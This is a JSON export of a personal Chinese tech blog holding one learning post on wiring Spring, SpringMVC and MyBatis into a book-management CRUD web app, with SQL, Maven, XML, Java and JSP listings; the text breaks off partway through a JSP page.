{"meta":{"title":"ggy的个人博客","subtitle":"hello,world.","description":"ggy","author":"ggy","url":"https://ggyggy666.github.io"},"pages":[{"title":"about","date":"2020-01-03T05:09:02.000Z","updated":"2020-01-03T05:09:02.313Z","comments":true,"path":"about/index.html","permalink":"https://ggyggy666.github.io/about/index.html","excerpt":"","text":""},{"title":"about,tags","date":"2020-01-03T04:36:05.000Z","updated":"2020-01-03T04:36:05.780Z","comments":true,"path":"about-tags/index.html","permalink":"https://ggyggy666.github.io/about-tags/index.html","excerpt":"","text":""},{"title":"tags","date":"2020-01-03T05:09:34.000Z","updated":"2020-01-03T05:09:34.922Z","comments":true,"path":"tags/index.html","permalink":"https://ggyggy666.github.io/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"SpringMVC学习(3)","slug":"SpringMVC学习-3","date":"2021-07-08T12:40:29.000Z","updated":"2021-07-09T07:30:51.477Z","comments":true,"path":"2021/07/08/SpringMVC学习-3/","link":"","permalink":"https://ggyggy666.github.io/2021/07/08/SpringMVC%E5%AD%A6%E4%B9%A0-3/","excerpt":"今天学习SSM框架的整合。狂神文章：https://mp.weixin.qq.com/s/SDxqGu_il3MUCTcN1EYrng","text":"今天学习SSM框架的整合。狂神文章：https://mp.weixin.qq.com/s/SDxqGu_il3MUCTcN1EYrng Mybatis层业务需求：对图书进行增删改查操作。 1.新建数据库、表，插入数据 123456789101112create database ssmbuild;use ssmbuild;create table book( bookID int(10) primary key not null auto_increment comment &quot;书ID&quot;, bookName varchar(100) not null comment &quot;书名&quot;, bookCounts int(11) not null comment &quot;书的数量&quot;, detail varchar(200) not null comment &quot;描述&quot;)engine&#x3D;innodb default charset&#x3D;utf8;insert into book(bookName, bookCounts, detail) values (&quot;Java&quot;, 10, &quot;从入门到精通&quot;), (&quot;Mysql&quot;, 1, &quot;必知必会&quot;), (&quot;Linux&quot;, 2, &quot;从入门到精通&quot;); 2.新建Maven项目，ssmbuild，添加web框架的支持。 3.pom.xml中导入需要的依赖 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061&lt;dependencies&gt; &lt;!--Junit--&gt; &lt;dependency&gt; &lt;groupId&gt;junit&lt;&#x2F;groupId&gt; &lt;artifactId&gt;junit&lt;&#x2F;artifactId&gt; &lt;version&gt;4.12&lt;&#x2F;version&gt; &lt;&#x2F;dependency&gt; &lt;!--数据库驱动--&gt; &lt;dependency&gt; &lt;groupId&gt;mysql&lt;&#x2F;groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;&#x2F;artifactId&gt; &lt;version&gt;5.1.47&lt;&#x2F;version&gt; &lt;&#x2F;dependency&gt; &lt;!-- 数据库连接池 --&gt; &lt;dependency&gt; &lt;groupId&gt;com.mchange&lt;&#x2F;groupId&gt; &lt;artifactId&gt;c3p0&lt;&#x2F;artifactId&gt; &lt;version&gt;0.9.5.2&lt;&#x2F;version&gt; &lt;&#x2F;dependency&gt; &lt;!--Servlet - JSP --&gt; &lt;dependency&gt; &lt;groupId&gt;javax.servlet&lt;&#x2F;groupId&gt; &lt;artifactId&gt;servlet-api&lt;&#x2F;artifactId&gt; &lt;version&gt;2.5&lt;&#x2F;version&gt; &lt;&#x2F;dependency&gt; &lt;dependency&gt; &lt;groupId&gt;javax.servlet.jsp&lt;&#x2F;groupId&gt; &lt;artifactId&gt;jsp-api&lt;&#x2F;artifactId&gt; &lt;version&gt;2.2&lt;&#x2F;version&gt; &lt;&#x2F;dependency&gt; &lt;dependency&gt; &lt;groupId&gt;javax.servlet&lt;&#x2F;groupId&gt; &lt;artifactId&gt;jstl&lt;&#x2F;artifactId&gt; &lt;version&gt;1.2&lt;&#x2F;version&gt; &lt;&#x2F;dependency&gt; &lt;!--Mybatis--&gt; &lt;dependency&gt; &lt;groupId&gt;org.mybatis&lt;&#x2F;groupId&gt; &lt;artifactId&gt;mybatis&lt;&#x2F;artifactId&gt; &lt;version&gt;3.5.2&lt;&#x2F;version&gt; &lt;&#x2F;dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.mybatis&lt;&#x2F;groupId&gt; &lt;artifactId&gt;mybatis-spring&lt;&#x2F;artifactId&gt; &lt;version&gt;2.0.2&lt;&#x2F;version&gt; &lt;&#x2F;dependency&gt; &lt;!--Spring--&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;&#x2F;groupId&gt; &lt;artifactId&gt;spring-webmvc&lt;&#x2F;artifactId&gt; &lt;version&gt;5.1.9.RELEASE&lt;&#x2F;version&gt; &lt;&#x2F;dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;&#x2F;groupId&gt; &lt;artifactId&gt;spring-jdbc&lt;&#x2F;artifactId&gt; &lt;version&gt;5.1.9.RELEASE&lt;&#x2F;version&gt; &lt;&#x2F;dependency&gt;&lt;&#x2F;dependencies&gt; 4.还需要设置build标签，使Maven的静态资源能够被导出 1234567891011121314151617181920&lt;build&gt; &lt;resources&gt; &lt;resource&gt; &lt;directory&gt;src&#x2F;main&#x2F;java&lt;&#x2F;directory&gt; &lt;includes&gt; &lt;include&gt;**&#x2F;*.properties&lt;&#x2F;include&gt; &lt;include&gt;**&#x2F;*.xml&lt;&#x2F;include&gt; &lt;&#x2F;includes&gt; &lt;filtering&gt;false&lt;&#x2F;filtering&gt; &lt;&#x2F;resource&gt; &lt;resource&gt; &lt;directory&gt;src&#x2F;main&#x2F;resources&lt;&#x2F;directory&gt; &lt;includes&gt; &lt;include&gt;**&#x2F;*.properties&lt;&#x2F;include&gt; &lt;include&gt;**&#x2F;*.xml&lt;&#x2F;include&gt; &lt;&#x2F;includes&gt; &lt;filtering&gt;false&lt;&#x2F;filtering&gt; &lt;&#x2F;resource&gt; &lt;&#x2F;resources&gt;&lt;&#x2F;build&gt; 5.建立基本框架 com.ggy包，下面有pojo, dao, service, controller。 Mybatis层需要连接Mybatis，因此需要db.properties数据库配置文件 1234jdbc.driver&#x3D;com.mysql.jdbc.Driverjdbc.url&#x3D;jdbc:mysql:&#x2F;&#x2F;localhost:3306&#x2F;ssmbuild?useUnicode&#x3D;true&amp;characterEncoding&#x3D;utf8jdbc.username&#x3D;rootjdbc.password&#x3D;root 如果是MySQL8以上，需要多一个参数，TimeZoneArea=Asia/Shanghai。 Mybatis-config.xml文件 1234567&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot; ?&gt;&lt;!DOCTYPE configuration PUBLIC &quot;-&#x2F;&#x2F;mybatis.org&#x2F;&#x2F;DTD Config 3.0&#x2F;&#x2F;EN&quot; &quot;http:&#x2F;&#x2F;mybatis.org&#x2F;dtd&#x2F;mybatis-3-config.dtd&quot;&gt;&lt;configuration&gt;&lt;&#x2F;configuration&gt; Spring需要applicationContext.xml文件 1234567&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;&lt;beans xmlns&#x3D;&quot;http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;beans&quot; xmlns:xsi&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XMLSchema-instance&quot; xsi:schemaLocation&#x3D;&quot;http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;beans http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;beans&#x2F;spring-beans.xsd&quot;&gt;&lt;&#x2F;beans&gt; 6.在pojo包下新建Book类 123456public class Book &#123; private int bookId; private String bookName; private int bookCounts; private String detail;&#125; 生成有参和无参构造函数，生成Getter and Setter方法，生成toString方法。 7.dao层写接口和xml实现 BookMapper 1234567891011121314151617181920212223package com.ggy.dao;import com.ggy.pojo.Book;import java.util.List;public interface BookMapper &#123; &#x2F;&#x2F;增加一个Book int addBook(Book book); &#x2F;&#x2F;根据id删除一个Book int deleteBookById(int id); &#x2F;&#x2F;更新Book int updateBook(Book books); &#x2F;&#x2F;根据id查询,返回一个Book Book queryBookById(int id); &#x2F;&#x2F;查询全部Book,返回list集合 List&lt;Book&gt; queryAllBook();&#125; BookMapper.xml 1234567891011121314151617181920212223242526272829303132&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot; ?&gt;&lt;!DOCTYPE mapper PUBLIC &quot;-&#x2F;&#x2F;mybatis.org&#x2F;&#x2F;DTD Config 3.0&#x2F;&#x2F;EN&quot; &quot;http:&#x2F;&#x2F;mybatis.org&#x2F;dtd&#x2F;mybatis-3-mapper.dtd&quot;&gt;&lt;mapper namespace&#x3D;&quot;com.ggy.dao.BookMapper&quot;&gt; &lt;insert id&#x3D;&quot;addBook&quot; parameterType&#x3D;&quot;Book&quot;&gt; insert into book (bookName, bookCounts, detail) values (#&#123;bookName&#125;, #&#123;bookCounts&#125;, #&#123;detail&#125;); &lt;&#x2F;insert&gt; &lt;!--根据id删除一个Book--&gt; &lt;delete id&#x3D;&quot;deleteBookById&quot; parameterType&#x3D;&quot;int&quot;&gt; delete from book where bookID&#x3D;#&#123;bookID&#125; &lt;&#x2F;delete&gt; &lt;!--更新Book--&gt; &lt;update id&#x3D;&quot;updateBook&quot; parameterType&#x3D;&quot;Book&quot;&gt; update books set bookName &#x3D; #&#123;bookName&#125;,bookCounts &#x3D; #&#123;bookCounts&#125;,detail &#x3D; #&#123;detail&#125; where bookID &#x3D; #&#123;bookID&#125; &lt;&#x2F;update&gt; &lt;!--根据id查询,返回一个Book--&gt; &lt;select id&#x3D;&quot;queryBookById&quot; resultType&#x3D;&quot;Book&quot;&gt; select * from book where bookID &#x3D; #&#123;bookID&#125; &lt;&#x2F;select&gt; &lt;!--查询全部Book--&gt; &lt;select id&#x3D;&quot;queryAllBook&quot; resultType&#x3D;&quot;Book&quot;&gt; SELECT * from books &lt;&#x2F;select&gt;&lt;&#x2F;mapper&gt; 8.在Mybatis-config.xml中注册这个Mapper.xml 123456789101112&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot; ?&gt;&lt;!DOCTYPE configuration PUBLIC &quot;-&#x2F;&#x2F;mybatis.org&#x2F;&#x2F;DTD Config 3.0&#x2F;&#x2F;EN&quot; &quot;http:&#x2F;&#x2F;mybatis.org&#x2F;dtd&#x2F;mybatis-3-config.dtd&quot;&gt;&lt;configuration&gt; &lt;typeAliases&gt; &lt;package name&#x3D;&quot;com.ggy.pojo&quot;&#x2F;&gt; &lt;&#x2F;typeAliases&gt; &lt;mappers&gt; &lt;mapper resource&#x3D;&quot;com&#x2F;ggy&#x2F;dao&#x2F;BookMapper.xml&quot;&#x2F;&gt; &lt;&#x2F;mappers&gt;&lt;&#x2F;configuration&gt; 9.编写业务层service，它其实也只是调用Dao层而已。 BookService 12345678910111213141516171819package com.ggy.service;import com.ggy.pojo.Book;import java.util.List;&#x2F;&#x2F;BookService:底下需要去实现,调用dao层public interface BookService &#123; &#x2F;&#x2F;增加一个Book int addBook(Book book); &#x2F;&#x2F;根据id删除一个Book int deleteBookById(int id); &#x2F;&#x2F;更新Book int updateBook(Book books); &#x2F;&#x2F;根据id查询,返回一个Book Book queryBookById(int id); &#x2F;&#x2F;查询全部Book,返回list集合 List&lt;Book&gt; queryAllBook();&#125; BookServiceImpl 1234567891011121314151617181920212223242526272829303132333435package com.ggy.service;import com.ggy.dao.BookMapper;import com.ggy.pojo.Book;import java.util.List;public class BookServiceImpl implements BookService &#123; &#x2F;&#x2F;调用dao层的操作，设置一个set接口，方便Spring管理 private BookMapper bookMapper; public void setBookMapper(BookMapper bookMapper) &#123; this.bookMapper &#x3D; bookMapper; &#125; public int addBook( Book book) &#123; return bookMapper.addBook(book); &#125; public int deleteBookById(int id) &#123; return bookMapper.deleteBookById(id); &#125; public int updateBook( Book books) &#123; return bookMapper.updateBook(books); &#125; public Book queryBookById(int id) &#123; return bookMapper.queryBookById(id); &#125; public List&lt;Book&gt; queryAllBook() &#123; return bookMapper.queryAllBook(); &#125;&#125; Spring层9.Spring整合Dao层，spring-dao.xml 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;&lt;beans xmlns&#x3D;&quot;http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;beans&quot; xmlns:xsi&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XMLSchema-instance&quot; xmlns:context&#x3D;&quot;http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;context&quot; xsi:schemaLocation&#x3D;&quot;http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;beans http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;beans&#x2F;spring-beans.xsd http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;context https:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;context&#x2F;spring-context.xsd&quot;&gt; &lt;!-- 配置整合mybatis --&gt; &lt;!-- 1.关联数据库文件 --&gt; &lt;context:property-placeholder location&#x3D;&quot;classpath:database.properties&quot;&#x2F;&gt; &lt;!-- 2.数据库连接池 --&gt; &lt;!--数据库连接池 dbcp 半自动化操作 不能自动连接 c3p0 自动化操作（自动的加载配置文件 并且设置到对象里面） --&gt; &lt;bean id&#x3D;&quot;dataSource&quot; class&#x3D;&quot;com.mchange.v2.c3p0.ComboPooledDataSource&quot;&gt; &lt;!-- 配置连接池属性 --&gt; &lt;property name&#x3D;&quot;driverClass&quot; value&#x3D;&quot;$&#123;jdbc.driver&#125;&quot;&#x2F;&gt; &lt;property name&#x3D;&quot;jdbcUrl&quot; value&#x3D;&quot;$&#123;jdbc.url&#125;&quot;&#x2F;&gt; &lt;property name&#x3D;&quot;user&quot; value&#x3D;&quot;$&#123;jdbc.username&#125;&quot;&#x2F;&gt; &lt;property name&#x3D;&quot;password&quot; value&#x3D;&quot;$&#123;jdbc.password&#125;&quot;&#x2F;&gt; &lt;!-- c3p0连接池的私有属性 --&gt; &lt;property name&#x3D;&quot;maxPoolSize&quot; value&#x3D;&quot;30&quot;&#x2F;&gt; &lt;property name&#x3D;&quot;minPoolSize&quot; value&#x3D;&quot;10&quot;&#x2F;&gt; &lt;!-- 关闭连接后不自动commit --&gt; &lt;property name&#x3D;&quot;autoCommitOnClose&quot; value&#x3D;&quot;false&quot;&#x2F;&gt; &lt;!-- 获取连接超时时间 --&gt; &lt;property name&#x3D;&quot;checkoutTimeout&quot; value&#x3D;&quot;10000&quot;&#x2F;&gt; &lt;!-- 当获取连接失败重试次数 --&gt; &lt;property name&#x3D;&quot;acquireRetryAttempts&quot; value&#x3D;&quot;2&quot;&#x2F;&gt; &lt;&#x2F;bean&gt; &lt;!-- 3.配置SqlSessionFactory对象 --&gt; &lt;bean id&#x3D;&quot;sqlSessionFactory&quot; class&#x3D;&quot;org.mybatis.spring.SqlSessionFactoryBean&quot;&gt; &lt;!-- 注入数据库连接池 --&gt; &lt;property name&#x3D;&quot;dataSource&quot; ref&#x3D;&quot;dataSource&quot;&#x2F;&gt; &lt;!-- 配置MyBaties全局配置文件:mybatis-config.xml --&gt; &lt;property name&#x3D;&quot;configLocation&quot; value&#x3D;&quot;classpath:mybatis-config.xml&quot;&#x2F;&gt; &lt;&#x2F;bean&gt; &lt;!-- 4.配置扫描Dao接口包，动态实现Dao接口注入到spring容器中 --&gt; &lt;!--解释 ：https:&#x2F;&#x2F;www.cnblogs.com&#x2F;jpfss&#x2F;p&#x2F;7799806.html--&gt; &lt;bean class&#x3D;&quot;org.mybatis.spring.mapper.MapperScannerConfigurer&quot;&gt; &lt;!-- 注入sqlSessionFactory --&gt; &lt;property name&#x3D;&quot;sqlSessionFactoryBeanName&quot; value&#x3D;&quot;sqlSessionFactory&quot;&#x2F;&gt; &lt;!-- 给出需要扫描Dao接口包 --&gt; &lt;property name&#x3D;&quot;basePackage&quot; value&#x3D;&quot;com.kuang.dao&quot;&#x2F;&gt; &lt;&#x2F;bean&gt;&lt;&#x2F;beans&gt; 一定要与applicationContext.xml在一块。 10.SPring整合Service层。spring-service.xml 123456789101112131415161718192021222324&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;&lt;beans xmlns&#x3D;&quot;http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;beans&quot; xmlns:xsi&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XMLSchema-instance&quot; xmlns:context&#x3D;&quot;http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;context&quot; xsi:schemaLocation&#x3D;&quot;http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;beans http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;beans&#x2F;spring-beans.xsd http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;context http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;context&#x2F;spring-context.xsd&quot;&gt; &lt;!-- 扫描service相关的bean --&gt; &lt;context:component-scan base-package&#x3D;&quot;com.kuang.service&quot; &#x2F;&gt; &lt;!--BookServiceImpl注入到IOC容器中--&gt; &lt;bean id&#x3D;&quot;BookServiceImpl&quot; class&#x3D;&quot;com.kuang.service.BookServiceImpl&quot;&gt; &lt;property name&#x3D;&quot;bookMapper&quot; ref&#x3D;&quot;bookMapper&quot;&#x2F;&gt; &lt;&#x2F;bean&gt; &lt;!-- 配置事务管理器 --&gt; &lt;bean id&#x3D;&quot;transactionManager&quot; class&#x3D;&quot;org.springframework.jdbc.datasource.DataSourceTransactionManager&quot;&gt; &lt;!-- 注入数据库连接池 --&gt; &lt;property name&#x3D;&quot;dataSource&quot; ref&#x3D;&quot;dataSource&quot; &#x2F;&gt; &lt;&#x2F;bean&gt;&lt;&#x2F;beans&gt; SpringMVC层11.web.xml中 1234567891011121314151617181920212223242526272829303132333435363738394041424344&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;&lt;web-app xmlns&#x3D;&quot;http:&#x2F;&#x2F;xmlns.jcp.org&#x2F;xml&#x2F;ns&#x2F;javaee&quot; xmlns:xsi&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XMLSchema-instance&quot; xsi:schemaLocation&#x3D;&quot;http:&#x2F;&#x2F;xmlns.jcp.org&#x2F;xml&#x2F;ns&#x2F;javaee http:&#x2F;&#x2F;xmlns.jcp.org&#x2F;xml&#x2F;ns&#x2F;javaee&#x2F;web-app_4_0.xsd&quot; version&#x3D;&quot;4.0&quot;&gt; &lt;!--DispatcherServlet--&gt; &lt;servlet&gt; &lt;servlet-name&gt;DispatcherServlet&lt;&#x2F;servlet-name&gt; &lt;servlet-class&gt;org.springframework.web.servlet.DispatcherServlet&lt;&#x2F;servlet-class&gt; &lt;init-param&gt; &lt;param-name&gt;contextConfigLocation&lt;&#x2F;param-name&gt; &lt;!--一定要注意:我们这里加载的是总的配置文件，之前被这里坑了！--&gt; &lt;param-value&gt;classpath:applicationContext.xml&lt;&#x2F;param-value&gt; &lt;&#x2F;init-param&gt; &lt;load-on-startup&gt;1&lt;&#x2F;load-on-startup&gt; &lt;&#x2F;servlet&gt; &lt;servlet-mapping&gt; &lt;servlet-name&gt;DispatcherServlet&lt;&#x2F;servlet-name&gt; &lt;url-pattern&gt;&#x2F;&lt;&#x2F;url-pattern&gt; &lt;&#x2F;servlet-mapping&gt; &lt;!--encodingFilter--&gt; &lt;filter&gt; &lt;filter-name&gt;encodingFilter&lt;&#x2F;filter-name&gt; &lt;filter-class&gt; org.springframework.web.filter.CharacterEncodingFilter &lt;&#x2F;filter-class&gt; &lt;init-param&gt; &lt;param-name&gt;encoding&lt;&#x2F;param-name&gt; &lt;param-value&gt;utf-8&lt;&#x2F;param-value&gt; &lt;&#x2F;init-param&gt; &lt;&#x2F;filter&gt; &lt;filter-mapping&gt; &lt;filter-name&gt;encodingFilter&lt;&#x2F;filter-name&gt; &lt;url-pattern&gt;&#x2F;*&lt;&#x2F;url-pattern&gt; &lt;&#x2F;filter-mapping&gt; &lt;!--Session过期时间--&gt; &lt;session-config&gt; &lt;session-timeout&gt;15&lt;&#x2F;session-timeout&gt; &lt;&#x2F;session-config&gt;&lt;&#x2F;web-app&gt; 12.spring-mvc.xml 1234567891011121314151617181920212223242526272829&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;&lt;beans xmlns&#x3D;&quot;http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;beans&quot; xmlns:xsi&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XMLSchema-instance&quot; xmlns:context&#x3D;&quot;http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;context&quot; xmlns:mvc&#x3D;&quot;http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;mvc&quot; xsi:schemaLocation&#x3D;&quot;http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;beans http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;beans&#x2F;spring-beans.xsd http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;context http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;context&#x2F;spring-context.xsd http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;mvc https:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;mvc&#x2F;spring-mvc.xsd&quot;&gt; &lt;!-- 配置SpringMVC --&gt; &lt;!-- 1.开启SpringMVC注解驱动 --&gt; &lt;mvc:annotation-driven &#x2F;&gt; &lt;!-- 2.静态资源默认servlet配置--&gt; &lt;mvc:default-servlet-handler&#x2F;&gt; &lt;!-- 3.配置jsp 显示ViewResolver视图解析器 --&gt; &lt;bean class&#x3D;&quot;org.springframework.web.servlet.view.InternalResourceViewResolver&quot;&gt; &lt;property name&#x3D;&quot;viewClass&quot; value&#x3D;&quot;org.springframework.web.servlet.view.JstlView&quot; &#x2F;&gt; &lt;property name&#x3D;&quot;prefix&quot; value&#x3D;&quot;&#x2F;WEB-INF&#x2F;jsp&#x2F;&quot; &#x2F;&gt; &lt;property name&#x3D;&quot;suffix&quot; value&#x3D;&quot;.jsp&quot; &#x2F;&gt; &lt;&#x2F;bean&gt; &lt;!-- 4.扫描web相关的bean --&gt; &lt;context:component-scan base-package&#x3D;&quot;com.ggy.controller&quot; &#x2F;&gt;&lt;&#x2F;beans&gt; 13.applicationContext.xml整合其它文件 1234567891011&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;&lt;beans xmlns&#x3D;&quot;http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;beans&quot; xmlns:xsi&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XMLSchema-instance&quot; xsi:schemaLocation&#x3D;&quot;http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;beans http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;beans&#x2F;spring-beans.xsd&quot;&gt; &lt;import resource&#x3D;&quot;spring-dao.xml&quot;&#x2F;&gt; &lt;import resource&#x3D;&quot;spring-service.xml&quot;&#x2F;&gt; &lt;import resource&#x3D;&quot;spring-mvc.xml&quot;&#x2F;&gt;&lt;&#x2F;beans&gt; 14.BookController类 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263package com.ggy.controller;import com.ggy.pojo.Book;import com.ggy.service.BookService;import org.springframework.beans.factory.annotation.Autowired;import org.springframework.beans.factory.annotation.Qualifier;import org.springframework.stereotype.Controller;import org.springframework.ui.Model;import org.springframework.web.bind.annotation.PathVariable;import org.springframework.web.bind.annotation.RequestMapping;import java.util.List;@Controller@RequestMapping(&quot;&#x2F;book&quot;)public class BookController &#123; @Autowired @Qualifier(&quot;BookServiceImpl&quot;) private BookService bookService; @RequestMapping(&quot;&#x2F;allBook&quot;) public String list(Model model) &#123; List&lt;Book&gt; list &#x3D; bookService.queryAllBook(); model.addAttribute(&quot;list&quot;, list); return &quot;allBook&quot;; &#125; @RequestMapping(&quot;&#x2F;toAddBook&quot;) public String toAddPaper() &#123; return &quot;addBook&quot;; &#125; @RequestMapping(&quot;&#x2F;addBook&quot;) public String addPaper(Book books) &#123; System.out.println(books); bookService.addBook(books); return &quot;redirect:&#x2F;book&#x2F;allBook&quot;; &#125; @RequestMapping(&quot;&#x2F;toUpdateBook&quot;) public String toUpdateBook(Model model, int id) &#123; Book books &#x3D; bookService.queryBookById(id); System.out.println(books); model.addAttribute(&quot;book&quot;,books ); return &quot;updateBook&quot;; &#125; @RequestMapping(&quot;&#x2F;updateBook&quot;) public String updateBook(Model model, Book book) &#123; System.out.println(book); bookService.updateBook(book); Book books &#x3D; bookService.queryBookById(book.getBookID()); model.addAttribute(&quot;books&quot;, books); return &quot;redirect:&#x2F;book&#x2F;allBook&quot;; &#125; @RequestMapping(&quot;&#x2F;del&#x2F;&#123;bookId&#125;&quot;) public String deleteBook(@PathVariable(&quot;bookId&quot;) int id) &#123; bookService.deleteBookById(id); return &quot;redirect:&#x2F;book&#x2F;allBook&quot;; &#125;&#125; 15.index.jsp 1234567891011121314151617181920212223242526272829&lt;%@ page language&#x3D;&quot;java&quot; contentType&#x3D;&quot;text&#x2F;html; charset&#x3D;UTF-8&quot; pageEncoding&#x3D;&quot;UTF-8&quot; %&gt;&lt;!DOCTYPE HTML&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;首页&lt;&#x2F;title&gt; &lt;style type&#x3D;&quot;text&#x2F;css&quot;&gt; a &#123; text-decoration: none; color: black; font-size: 18px; &#125; h3 &#123; width: 180px; height: 38px; margin: 100px auto; text-align: center; line-height: 38px; background: deepskyblue; border-radius: 4px; &#125; &lt;&#x2F;style&gt;&lt;&#x2F;head&gt;&lt;body&gt;&lt;h3&gt; &lt;a href&#x3D;&quot;$&#123;pageContext.request.contextPath&#125;&#x2F;book&#x2F;allBook&quot;&gt;点击进入列表页&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt; 16.addBook.jsp 123456789101112131415161718192021222324252627282930&lt;%@ taglib prefix&#x3D;&quot;c&quot; uri&#x3D;&quot;http:&#x2F;&#x2F;java.sun.com&#x2F;jsp&#x2F;jstl&#x2F;core&quot; %&gt;&lt;%@ page contentType&#x3D;&quot;text&#x2F;html;charset&#x3D;UTF-8&quot; language&#x3D;&quot;java&quot; %&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;新增书籍&lt;&#x2F;title&gt; &lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, initial-scale&#x3D;1.0&quot;&gt; &lt;!-- 引入 Bootstrap --&gt; &lt;link href&#x3D;&quot;https:&#x2F;&#x2F;cdn.bootcss.com&#x2F;bootstrap&#x2F;3.3.7&#x2F;css&#x2F;bootstrap.min.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;&lt;&#x2F;head&gt;&lt;body&gt;&lt;div class&#x3D;&quot;container&quot;&gt; &lt;div class&#x3D;&quot;row clearfix&quot;&gt; &lt;div class&#x3D;&quot;col-md-12 column&quot;&gt; &lt;div class&#x3D;&quot;page-header&quot;&gt; &lt;h1&gt; &lt;small&gt;新增书籍&lt;&#x2F;small&gt; &lt;&#x2F;h1&gt; &lt;&#x2F;div&gt; &lt;&#x2F;div&gt; &lt;&#x2F;div&gt; &lt;form action&#x3D;&quot;$&#123;pageContext.request.contextPath&#125;&#x2F;book&#x2F;addBook&quot; method&#x3D;&quot;post&quot;&gt; 书籍名称：&lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;bookName&quot;&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt; 书籍数量：&lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;bookCounts&quot;&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt; 书籍详情：&lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;detail&quot;&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt; &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;添加&quot;&gt; &lt;&#x2F;form&gt;&lt;&#x2F;div&gt; 17.allBook.jsp 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960&lt;%@ taglib prefix&#x3D;&quot;c&quot; uri&#x3D;&quot;http:&#x2F;&#x2F;java.sun.com&#x2F;jsp&#x2F;jstl&#x2F;core&quot; %&gt;&lt;%@ page contentType&#x3D;&quot;text&#x2F;html;charset&#x3D;UTF-8&quot; language&#x3D;&quot;java&quot; %&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;书籍列表&lt;&#x2F;title&gt; &lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, initial-scale&#x3D;1.0&quot;&gt; &lt;!-- 引入 Bootstrap --&gt; &lt;link href&#x3D;&quot;https:&#x2F;&#x2F;cdn.bootcss.com&#x2F;bootstrap&#x2F;3.3.7&#x2F;css&#x2F;bootstrap.min.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;&lt;&#x2F;head&gt;&lt;body&gt;&lt;div class&#x3D;&quot;container&quot;&gt; &lt;div class&#x3D;&quot;row clearfix&quot;&gt; &lt;div class&#x3D;&quot;col-md-12 column&quot;&gt; &lt;div class&#x3D;&quot;page-header&quot;&gt; &lt;h1&gt; &lt;small&gt;书籍列表 —— 显示所有书籍&lt;&#x2F;small&gt; &lt;&#x2F;h1&gt; &lt;&#x2F;div&gt; &lt;&#x2F;div&gt; &lt;&#x2F;div&gt; &lt;div 